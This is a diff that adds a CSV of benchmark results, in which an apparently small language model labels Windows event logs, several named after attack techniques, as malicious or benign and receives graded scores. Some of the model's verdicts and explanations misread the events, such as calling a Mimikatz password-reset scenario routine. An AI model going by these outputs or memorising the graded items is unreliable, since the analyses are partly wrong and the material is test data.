@@ -1,0 +1,1402 @@
+# DETECTION BENCHMARK RESULTS - column glossary
+# ----------------------------------------------------------------------
+# Model               LLM model id used to score this run
+# Filename            Source artifact analyzed (EVTX file or CSV stem)
+# Difficulty          Tag from metadata.json: easy / medium / hard
+# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
+# Status              processed | error | context_exceeded
+# Malicious           Model verdict: YES (attack) or NO (routine/benign)
+# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
+# Alignment %         Share of cited evidence found verbatim in source (0-100)
+# Structure Valid     Response parsed cleanly into the required sections
+# Event IDs           Event IDs extracted from the model's EVIDENCE block
+# Processes           Process names extracted from the model's EVIDENCE block
+# Accounts            Account names extracted from the model's EVIDENCE block
+# Commands            Command lines / script blocks extracted from EVIDENCE
+# Network             IPs / hostnames / shares extracted from EVIDENCE
+# Registry            Registry keys / values extracted from EVIDENCE
+# Hallucination %     Share of cited evidence not found in source events (0-100)
+# Response Time (s)   Wall-clock seconds from prompt sent to response received
+# Extraction (6)      Did the model find the right evidence? (0-6)
+# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
+# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
+# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
+# Total (20)          Sum of the four criteria above (0-20)
+# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
+# LLM Response        Full raw text the model returned, before any parsing
+#
+# Skip these lines in pandas:  pd.read_csv(path, comment='#')
+# ----------------------------------------------------------------------
+Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4103-4104-OpenSSH server activation and config.evtx,hard,A,error,NO,0.0,0.0,NO,,,,,,,,0.27,,,,,,,Error: HTTP 400
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4103-4104-OpenSSH server install.evtx,hard,A,processed,NO,100.0,87.5,YES,"4103, 4104, 40961, 53504, 40962",powershell.exe,"OFFSEC\admmig, OFFSEC\SYSTEM","Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0, Set-Alias, Export-ModuleMember, Add-WindowsCapability, Out-Default, Set-StrictMode, Write-Host 'Final result: 1' | , $global:?",,,0.0,11.42,5.2,5.0,4.0,2,16.2,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4103, 4104, 40961, 53504, 40962
+- Processes: powershell.exe
+- Accounts: OFFSEC\admmig, OFFSEC\SYSTEM
+- Commands: Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0, Set-Alias, Export-ModuleMember, Add-WindowsCapability, Out-Default, Set-StrictMode, Write-Host 'Final result: 1';, $global:?
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show the installation of the OpenSSH Server capability and the execution of standard PowerShell module loading commands (Set-Alias, Export-ModuleMember) by a user account, followed by a system-level script execution. These activities are consistent with routine system administration or software installation tasks rather than malicious behavior, as there are no suspicious network connections, obfuscated payloads, or unauthorized privilege escalation chains evident in the provided data."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID33205-SQL Server failed login with disabled SA account.evtx,easy,A,processed,YES,100.0,100.0,YES,33205,,sa,,10.23.23.9,,0.0,2.80,6.0,2.0,4.0,3,15.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 33205, 33205
+- Processes: None
+- Accounts: sa
+- Commands: None
+- Network: 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The logs show two consecutive failed login attempts for the highly privileged 'sa' account from the same IP address (10.23.23.9) within a 21-second window. This pattern indicates a brute-force or password-guessing attack targeting the database administrator account, which is a significant security threat."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4625-failed login with denied access due to account restriction.evtx,easy,A,processed,YES,100.0,100.0,YES,4625,C:\Windows\System32\winlogon.exe,"FS03$, -",,10.23.23.9,,0.0,3.15,6.0,2.0,4.0,4,16.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4625, 4625
+- Processes: C:\Windows\System32\winlogon.exe
+- Accounts: FS03$, -
+- Commands: None
+- Network: 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The logs show two consecutive failed logon attempts (Event ID 4625) from the same source IP address (10.23.23.9) within a short timeframe, which is indicative of a brute-force or password guessing attack. The repeated failures with the same target account and source IP suggest an automated or persistent attempt to gain unauthorized access."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID33205-SQL Server member added to database role.evtx,easy,A,processed,NO,100.0,68.8,YES,33205,,"OFFSEC\admmig, test-sql, dbo",ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql,,,0.0,2.68,4.1,5.0,4.0,2,15.1,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 33205
+- Processes: None
+- Accounts: OFFSEC\admmig, test-sql, dbo
+- Commands: ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql]
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event records a standard SQL Server audit action where an administrator account (OFFSEC\admmig) adds a user (test-sql) to a database role. This is a routine database administration task and does not exhibit characteristics of malicious activity such as unauthorized access or privilege escalation attacks."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID33205-SQL Server user linked to a database.evtx,easy,A,processed,NO,100.0,88.9,YES,33205,,"OFFSEC\admmig, dbo, test-sql",CREATE USER [test-sql] FOR LOGIN [test-sql,,,0.0,2.58,5.3,5.0,4.0,2,16.3,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 33205
+- Processes: None
+- Accounts: OFFSEC\admmig, dbo, test-sql
+- Commands: CREATE USER [test-sql] FOR LOGIN [test-sql]
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event records a successful SQL Server audit action where a database user was created for a login, which is a standard administrative task. There are no indicators of compromise, such as failed logins, privilege escalation chains, or suspicious command execution, making this routine database management activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4723-5145-password reset with changeNTLM (Mimikatz).evtx,easy,A,processed,NO,100.0,100.0,YES,4723,,"hacker2, admmig",,,,0.0,2.14,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4723
+- Processes: None
+- Accounts: hacker2, admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+Event ID 4723 indicates an attempt to change a user account password, which is a routine administrative action. There is no evidence of privilege escalation, suspicious command execution, or network-based attack indicators in this single event."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4728-Member adding to a group by the same account.evtx,easy,A,processed,NO,100.0,100.0,YES,4728,,"lambda-user, Group02",,,,0.0,2.66,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4728
+- Processes: None
+- Accounts: lambda-user, Group02
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event indicates that the user 'lambda-user' added themselves to the security group 'Group02'. This is a routine administrative action where a user modifies group membership, and there is no evidence of privilege escalation to high-privilege groups (like Domain Admins) or suspicious command execution. Without context linking this to other malicious activities or high-impact privilege changes, this single event is considered benign."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4738-Account is sensitive and cannot be delegated.evtx,easy,A,processed,YES,100.0,100.0,YES,4738,,"hack1, admmig",,,,0.0,3.82,6.0,2.0,4.0,3,15.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4738, 4738
+- Processes: None
+- Accounts: hack1, admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show a rapid sequence of account modifications on the user ""hack1"" performed by ""admmig"", specifically toggling the User Account Control (UAC) flags. The first event enables the ""DONT_EXPIRE_PASSWORD"" flag (changing UAC from 0x210 to 0x4210), and the second event immediately reverts it (changing UAC from 0x4210 to 0x210), which is a common technique to reset password expiration timers or maintain persistence without triggering standard password change alerts. This pattern of rapid, contradictory state changes on a single account identifier indicates suspicious administrative activity rather than routine maintenance."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4738-Password cannot be changed.evtx,easy,A,processed,NO,100.0,100.0,YES,4738,,"hack1, admmig",,,,0.0,2.87,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4738, 4738
+- Processes: None
+- Accounts: hack1, admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show two identical Event ID 4738 (User Account Management) events where the account 'hack1' was modified by 'admmig'. There is no evidence of privilege escalation, command execution, or network activity, and the account names appear to be standard test or administrative accounts without indicators of compromise."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4738-Password never expires.evtx,easy,A,processed,YES,100.0,100.0,YES,4738,,"hack1, admmig",,,,0.0,3.34,6.0,2.0,4.0,2,14.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4738, 4738
+- Processes: None
+- Accounts: hack1, admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show a rapid sequence of account modifications on the user 'hack1' performed by 'admmig', where the User Account Control (UAC) flags were first changed to enable account disablement (0x210) and then immediately reverted to normal status (0x10) within two seconds. This pattern of toggling account status flags is a common technique used by attackers to evade detection or disrupt monitoring while maintaining access, indicating malicious intent rather than routine administration."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4720-Local user created.evtx,easy,A,processed,YES,100.0,83.3,YES,"4720, 4732",,"hacking-local-acct, admmig",,,,0.0,2.72,5.0,2.0,4.0,3,14.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4720, 4732
+- Processes: None
+- Accounts: hacking-local-acct, admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show the creation of a new local account named ""hacking-local-acct"" followed immediately by its addition to the local ""Users"" group, which is a common tactic for establishing persistence or backdoor access. The account name itself is highly suspicious and indicative of malicious intent rather than routine administrative activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID60-High volume file downloaded with BITS.evtx,easy,A,processed,NO,100.0,83.3,YES,"3, 5, 59, 60",,OFFSEC\admmig,,https://releases.ubuntu.com/20.04.3/ubuntu-20.04.3-desktop-amd64.iso,,0.0,3.67,5.0,5.0,4.0,2,16.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 3, 5, 59, 60
+- Processes: None
+- Accounts: OFFSEC\admmig
+- Commands: None
+- Network: https://releases.ubuntu.com/20.04.3/ubuntu-20.04.3-desktop-amd64.iso
+- Registry: None
+
+EXPLANATION:
+The logs show a user downloading a large, legitimate Ubuntu Linux ISO file from an official public repository using the Background Intelligent Transfer Service (BITS). This activity is consistent with routine software acquisition or testing and lacks indicators of malicious behavior such as data exfiltration to suspicious domains or execution of unauthorized binaries."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4688-sqlcmd tool abuse in SQL Server.evtx,easy,A,processed,NO,100.0,100.0,YES,4688,"SQLCMD.EXE, cmd.exe",admmig,"sqlcmd  -S .\RADAR,2020",,,0.0,2.62,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4688
+- Processes: SQLCMD.EXE, cmd.exe
+- Accounts: admmig
+- Commands: sqlcmd  -S .\RADAR,2020
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the execution of `sqlcmd` to connect to a local SQL Server instance (`.\RADAR`) by a user account, which is a standard administrative or application task. There are no indicators of malicious behavior such as suspicious command chaining, privilege escalation, or unauthorized network connections in this isolated event."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID12-LSA Protect mode enabled RunAsPPL.evtx,easy,D,processed,NO,100.0,100.0,YES,"14, 12",,,,,,0.0,2.29,6.0,4.0,4.0,1,15.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 14, 12
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs contain only standard system events from the Microsoft-Windows-Wininit provider, specifically Event ID 14 (configuration changes) and Event ID 12 (system startup/shutdown or similar status). There are no suspicious processes, commands, network connections, or registry modifications that would indicate malicious activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4664-symbolic link created.evtx,easy,A,processed,NO,100.0,100.0,YES,4664,,Admin,,,,0.0,2.07,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4664
+- Processes: None
+- Accounts: Admin
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event indicates that the user ""Admin"" accessed a Sysmon configuration file located in the Downloads folder. This appears to be routine administrative activity involving the management or review of security tooling configuration, with no evidence of malicious execution, network communication, or unauthorized privilege escalation."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4673-Privilege SeMachineAccountPrivilege called.evtx,easy,A,processed,NO,100.0,100.0,YES,4673,C:\Windows\System32\lsass.exe,hack1,,,,0.0,2.48,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4673
+- Processes: C:\Windows\System32\lsass.exe
+- Accounts: hack1
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event indicates that the user 'hack1' exercised the 'SeMachineAccountPrivilege' privilege, which is a standard permission typically held by computer accounts to join domains or update machine account passwords. This activity is performed by the legitimate system process 'lsass.exe' and does not exhibit characteristics of malicious behavior such as unauthorized privilege escalation or suspicious command execution."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4717-4718-System security granded to account.evtx,easy,A,processed,NO,100.0,100.0,YES,"4717, 4718",,admmig,,,,0.0,2.81,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4717, 4718
+- Processes: None
+- Accounts: admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show the assignment (Event 4717) and subsequent removal (Event 4718) of the ""SeDenyServiceLogonRight"" privilege for the account ""admmig"". This sequence represents a standard administrative action where a user is temporarily denied and then re-granted the right to log on as a service, which is a common benign configuration change rather than an attack indicator."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID5136-4662 sensitive GPO edited.evtx,easy,A,processed,YES,100.0,100.0,YES,"4662, 5136",,"admmig, FS02$, ROOTDC1$",,,,0.0,6.90,6.0,2.0,4.0,3,15.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4662, 5136
+- Processes: None
+- Accounts: admmig, FS02$, ROOTDC1$
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show the account 'admmig' modifying the 'versionNumber' attribute of a Group Policy Object (GPO) on the domain controller, which is a common technique for persistence or privilege escalation via GPO tampering. The subsequent access by machine accounts 'FS02$' and 'ROOTDC1$' to the same GPO object indicates the policy is being applied or enforced, confirming the impact of the unauthorized modification."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4964-Login of a member of a special group.evtx,easy,A,processed,NO,100.0,100.0,YES,4964,,"LOCAL SERVICE, ROOTDC1$, admmig",,,,0.0,4.05,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4964
+- Processes: None
+- Accounts: LOCAL SERVICE, ROOTDC1$, admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+Event ID 4964 indicates that a user's global group membership was changed, which is a routine administrative action often performed by system accounts like LOCAL SERVICE or ROOTDC1$. There is no evidence of malicious command execution, network activity, or unauthorized access patterns in these logs."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID5124-OCSP security settings changed.evtx,easy,A,processed,NO,100.0,100.0,YES,"5121, 5120, 5123, 5124",,admmig,,,,0.0,3.35,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 5121, 5120, 5123, 5124
+- Processes: None
+- Accounts: admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The events indicate routine administrative configuration changes to OCSP (Online Certificate Status Protocol) settings, such as modifying cache entries, thread counts, and audit filters. The account 'admmig' appears to be a service or administrative account performing standard maintenance on the PKI infrastructure, with no evidence of privilege escalation, lateral movement, or malicious command execution."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID1-SYSMON driver unload (FilterManager).evtx,easy,A,processed,NO,100.0,100.0,YES,1,,,,,,0.0,1.93,6.0,4.0,4.0,1,15.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event indicates the successful loading of the SysmonDrv driver, which is a legitimate system monitoring tool. There are no indicators of malicious activity, such as suspicious commands, unauthorized accounts, or network connections, in this single event."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID13-Defender service configuration disabled.evtx,easy,A,processed,NO,100.0,83.3,YES,13,C:\Windows\system32\services.exe,,,,HKLM\System\CurrentControlSet\Services\WdNisDrv\Start,0.0,2.86,5.0,5.0,4.0,2,16.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 13, 13
+- Processes: C:\Windows\system32\services.exe
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: HKLM\System\CurrentControlSet\Services\WdNisDrv\Start
+
+EXPLANATION:
+The events show the Windows Service Control Manager (services.exe) setting the 'Start' value for the Windows Defender Network Inspection Service (WdNisDrv) to 3 (Manual), which is a standard system configuration change. There is no evidence of malicious activity, such as disabling security services (setting Start to 4) or unauthorized process execution."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID8-Module Virtualization disabled (Credential Guard).evtx,easy,A,processed,NO,100.0,100.0,YES,"8, 10, 7, 9",,,,,,0.0,6.76,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 8, 10, 7, 9
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs display standard Windows Servicing events (Event IDs 7, 8, 9, 10) related to the installation and state changes of optional Windows components such as Windows Defender, Printing features, and Hyper-V. All operations show successful completion with error code 0x0, indicating routine system maintenance or feature enablement rather than malicious activity. There are no suspicious processes, accounts, or network indicators present in the data."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4739-Domain policy changed by non system account.evtx,easy,A,processed,NO,100.0,100.0,YES,4739,,admmig,,,,0.0,2.76,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4739
+- Processes: None
+- Accounts: admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event (Event ID 4739) indicates that domain policy settings were changed, but all specific policy values (such as password length, lockout thresholds, and machine account quota) are recorded as ""-"" (unchanged or not applicable). There is no evidence of privilege escalation, suspicious command execution, or network activity associated with this single event. Therefore, it represents routine administrative activity or a no-op policy refresh rather than malicious behavior."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-mmc-c-windows-system32-services-msc.csv,,,processed,NO,100.0,100.0,YES,1,"mmc.exe, explorer.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\services.msc"" , C:\Windows\Explorer.EXE",,,0.0,3.07,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe, explorer.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\services.msc"" , C:\Windows\Explorer.EXE
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the Administrator user launching the Microsoft Management Console (mmc.exe) to view the Services management snap-in (services.msc), which is a standard administrative task. There are no indicators of malicious behavior, such as suspicious command lines, network connections, or unauthorized privilege escalation, making this routine system administration activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-mmc-c-windows-system32-eventvwr-msc.csv,,,processed,NO,100.0,100.0,YES,1,"mmc.exe, explorer.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s, C:\Windows\Explorer.EXE",,,0.0,2.88,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe, explorer.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s, C:\Windows\Explorer.EXE
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the Administrator launching the Event Viewer (eventvwr.msc) via the Microsoft Management Console (mmc.exe), which is a standard administrative task. There are no suspicious command lines, network connections, or unusual process behaviors indicating malicious activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-mmc-c-windows-system32-secpol-msc.csv,,,processed,NO,100.0,100.0,YES,1,"mmc.exe, ServerManager.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\secpol.msc"" /s, ""C:\Windows\system32\ServerManager.exe""",,,0.0,2.99,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe, ServerManager.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\secpol.msc"" /s, ""C:\Windows\system32\ServerManager.exe"" 
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the Administrator launching the Local Security Policy console (secpol.msc) via Server Manager, which is a standard administrative task. There are no indicators of malicious activity, such as suspicious command lines, unauthorized network connections, or unusual process behaviors."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-rundll32-appxdeploymentextensions-onecore-dll-shellrefres.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe","WIN-FPV0DSIC9O6\Administrator, NT AUTHORITY\SYSTEM","rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh, C:\Windows\system32\svchost.exe -k wsappx -p -s AppXSvc",,,0.0,3.76,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator, NT AUTHORITY\SYSTEM
+- Commands: rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh, C:\Windows\system32\svchost.exe -k wsappx -p -s AppXSvc
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the legitimate Windows process `rundll32.exe` executing a standard system function (`ShellRefresh`) within the `AppXDeploymentExtensions.OneCore.dll` library. This activity is initiated by the `svchost.exe` process running under the `AppXSvc` service, which is a normal background operation for handling Windows Store app deployments and does not indicate malicious behavior."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-mmc-c-windows-system32-comexp-msc.csv,,,processed,NO,100.0,100.0,YES,1,"mmc.exe, ServerManager.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\comexp.msc"" , ""C:\Windows\system32\ServerManager.exe""",,,0.0,3.12,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe, ServerManager.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\comexp.msc"" , ""C:\Windows\system32\ServerManager.exe"" 
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the legitimate Microsoft Management Console (mmc.exe) being launched by ServerManager.exe to open the Component Services snap-in (comexp.msc). This is a standard administrative action performed by the Administrator account and does not exhibit characteristics of malicious activity such as suspicious process injection, unusual network connections, or unauthorized privilege escalation."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-mmc-c-windows-system32-gpedit-msc.csv,,,processed,NO,100.0,100.0,YES,1,"mmc.exe, sihost.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpedit.msc, sihost.exe",,,0.0,2.83,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe, sihost.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpedit.msc, sihost.exe
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the Microsoft Management Console (mmc.exe) launching the Group Policy Editor (gpedit.msc), which is a standard administrative task. There are no indicators of malicious behavior, such as suspicious command lines, network connections, or unauthorized privilege escalation, making this routine system administration activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-dism-online.csv,,,processed,NO,100.0,100.0,YES,1,Dism.exe,WIN-FPV0DSIC9O6\Administrator,"C:\Windows\system32\dism.exe /online /logpath:""C:\Windows\debug\DNS-Server-Full-Role_install.dcpromoui_cbs.log"" /norestart /quiet /Enable-Feature /FeatureName:DNS-Server-Full-Role /FeatureName:DNS-Server-Tools /all",,,0.0,3.27,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: Dism.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator
+- Commands: C:\Windows\system32\dism.exe /online /logpath:""C:\Windows\debug\DNS-Server-Full-Role_install.dcpromoui_cbs.log"" /norestart /quiet /Enable-Feature /FeatureName:DNS-Server-Full-Role /FeatureName:DNS-Server-Tools /all
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the legitimate Microsoft utility Dism.exe being used to install DNS Server roles, which is a standard administrative task. The command line arguments are consistent with routine system configuration rather than malicious activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-reg-query.csv,,,processed,NO,100.0,90.0,YES,1,"reg.exe, cmd.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\reg.exe  query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64, C:\Windows\system32\cmd.exe /c C:\Windows\system32\reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64",,hklm\software\microsoft\windows\softwareinventorylogging,0.0,3.78,5.4,5.0,4.0,3,17.4,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: reg.exe, cmd.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\reg.exe  query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64, C:\Windows\system32\cmd.exe /c C:\Windows\system32\reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64
+- Network: None
+- Registry: hklm\software\microsoft\windows\softwareinventorylogging
+
+EXPLANATION:
+The activity involves the legitimate system tool `reg.exe` querying a specific registry key related to Software Inventory Logging, executed by the `NT AUTHORITY\SYSTEM` account. This is a routine administrative or system maintenance task and does not exhibit characteristics of malicious behavior such as persistence mechanisms, lateral movement, or data exfiltration."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-regsvr32-s.csv,,,processed,NO,100.0,87.5,YES,1,"regsvr32.exe, spoolsv.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\regsvr32.exe /s ""C:\Windows\system32\spool\drivers\x64\3\PrintConfig.dll""",,,0.0,3.35,5.2,5.0,4.0,2,16.2,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: regsvr32.exe, spoolsv.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\regsvr32.exe /s ""C:\Windows\system32\spool\drivers\x64\3\PrintConfig.dll""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The event shows the Print Spooler service (spoolsv.exe) executing regsvr32.exe to register a legitimate system DLL (PrintConfig.dll) located in the standard Windows driver directory. This is a routine system maintenance activity performed by the SYSTEM account and does not exhibit characteristics of malicious execution such as suspicious paths, unsigned binaries, or network connections."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,BENIGN-ID1-rundll32-c-windows-system32-shell32-dll-shcreatelocalserv.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe","SIGMA\Administrator, NT AUTHORITY\SYSTEM","C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p",,,0.0,4.08,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe
+- Accounts: SIGMA\Administrator, NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
+- Network: None
+- Registry: None
+
+EXPLANATION:
